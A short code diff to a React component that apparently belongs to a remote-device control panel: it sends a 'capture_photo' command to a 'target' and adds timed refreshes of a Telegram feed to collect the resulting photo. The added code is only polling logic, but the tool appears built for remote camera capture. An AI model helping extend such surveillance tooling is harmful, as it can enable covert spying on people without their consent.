@@ -33,6 +33,16 @@ export default function PhotoGallery({ targetId, targets = [], onTargetChange }:
     try {
       await sendCommand(targetId, 'capture_photo');
       toast.success('Triggering camera on target...');
+      
+      // Force refresh telegram feed after a short delay to catch the new photo
+      setTimeout(() => {
+        refreshTg();
+        toast.info('Checking for new Telegram capture...');
+      }, 3000);
+      
+      // Second check after 7 seconds just in case it's slow
+      setTimeout(() => refreshTg(), 7000);
+      
     } catch (error) {
       toast.error('Failed to send capture command.');
     } finally {
